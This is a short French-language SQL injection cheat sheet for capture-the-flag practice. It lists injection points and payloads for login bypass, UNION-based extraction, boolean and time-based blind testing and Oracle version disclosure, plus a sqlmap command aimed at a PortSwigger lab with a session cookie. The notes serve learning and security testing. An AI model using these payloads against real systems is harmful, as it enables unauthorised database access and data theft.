# Guide SQLi (CTF)

### 1. Points d'entrée

* Formulaires de connexion (Login).
* Barres de recherche.
* Paramètres d'URL (`?id=123`).

### 2. Contextes et Payloads

> **Astuce :** Testez d'abord `'` pour provoquer une erreur.

* **Numérique :** `?id=1 OR 1=1`
* **Texte :** `?user=admin' --` ou `?user=' OR '1'='1' --`

### 3. Extraction via UNION

Utilisé si l'application affiche les données à l'écran.

1. **Trouver les colonnes :** `?id=1 ORDER BY X--` (incrémenter X).
2. **Tester l'affichage :** `?id=-1 UNION SELECT NULL,NULL,NULL--`

### 4. Injection Aveugle (Blind)

Utilisé si rien ne s'affiche.

* **Booléen :** Comparer `?id=1 AND 1=1` (vrai) et `?id=1 AND 1=2` (faux).
* **Temps (MySQL) :** `?id=1 AND IF(1=1, SLEEP(2), 0)--` (vérifier le délai de réponse).

### 5. Ref
https://portswigger.net/web-security/sql-injection
https://owasp.org/www-community/attacks/SQL_Injection
https://github.com/sqlmapproject/sqlmap/wiki
https://portswigger.net/web-security/sql-injection/cheat-sheet


`sqlmap -u "https://0afd00b604ce2a7380a10318003c00e1.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=SAZWfRVzBGBW2W76wuI2VNDGHqUiiJYF" -p category --dbs`

connaitre d'abord le nombre de colonne retourner dans la réponse à la requête: `?user=bro' order by x --` (incrément x jusqu'à avoir une erreur)
recupérer ensuite les données : `?user=bro' union select 'a','b' from dual--` (pour une BD oracle; nous avons 'a' et 'b' car nous supposons qu'il y a que 2 colonnes) 
e.g recupérer la version de BD oracle : `?user=bro' union select 'a',banner from v$version--`
